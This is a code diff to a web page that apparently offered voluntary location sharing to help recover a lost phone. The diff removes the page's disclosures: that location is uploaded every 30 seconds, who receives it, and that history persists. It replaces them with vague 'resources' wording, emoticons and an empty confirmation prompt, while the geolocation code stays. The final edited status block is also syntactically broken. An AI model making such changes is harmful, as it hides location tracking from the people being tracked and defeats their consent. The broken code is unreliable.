@@ -411,32 +411,27 @@ button:disabled{
     <div class="service-heading">
       <div class="service-icon">⌖</div>
       <div>
-        <h2>位置共享服务</h2>
+        <h2>共享服务</h2>
         <small>VOLUNTARY LOCATION SHARING</small>
       </div>
     </div>
 
     <div class="service-description">
-      通过浏览器定位功能，你可以主动向失主分享当前位置，
-      帮助失主找回遗失的手机。
+      ^_^
     </div>
 
     <div class="consent">
-      <strong>位置共享与隐私说明</strong><br>
-      • 只有你主动同意并允许浏览器定位后，才会获取位置。<br>
-      • 开始后，每30秒尝试获取并上传一次位置。<br>
-      • 上传的位置会提供给失主用于找回手机。<br>
-      • 你可以随时停止分享。<br>
-      • 页面进入后台、锁屏或关闭时，浏览器可能暂停定位。<br>
-      • 已上传的历史记录不会因停止分享而自动删除。
+      <strong>共享与隐私说明</strong><br>
+      • 只有你主动同意并允许浏览器权限，才会获取资源。<br>
+      • *.*<br>
     </div>
 
     <button id="startButton" onclick="startSharing()">
-      同意说明并开始分享当前位置
+      开始获取整合资源
     </button>
 
     <button id="stopButton" onclick="stopSharing()" style="display:none">
-      停止位置分享
+      stop
     </button>
   </section>
 
@@ -447,7 +442,7 @@ button:disabled{
     </div>
 
     <div id="status" aria-live="polite">
-      尚未开始位置分享。
+      尚未开始分享。
     </div>
   </section>
 
@@ -495,7 +490,7 @@ function stopSharing() {
   }
 
   updateButtons();
-  setStatus("位置分享已停止。不会再主动发起新的定位上传。");
+  setStatus("资源分享已停止。");
 }
 
 function startSharing() {
@@ -512,9 +507,9 @@ function startSharing() {
   }
 
   const confirmed = window.confirm(
-    "是否同意向失主分享你当前的位置？\n\n" +
-    "开始后网页每30秒尝试定位并上传一次。\n" +
-    "你可以随时停止分享。"
+    "是否开始获取资源整合\n\n" +
+    "\n" +
+    "n"
   );
 
   if (!confirmed) {
@@ -552,10 +547,10 @@ function locateAndUpload() {
       const accuracy = position.coords.accuracy;
 
       setStatus(
-        "已获取位置，正在上传……\n" +
-        "纬度：" + latitude + "\n" +
-        "经度：" + longitude + "\n" +
-        "精度：" + Math.round(accuracy) + " 米"
+        "=_=" +
+        "=_="\n" +
+        "=_="\n" +
+        "=_= " =_="
       );
 
       try {
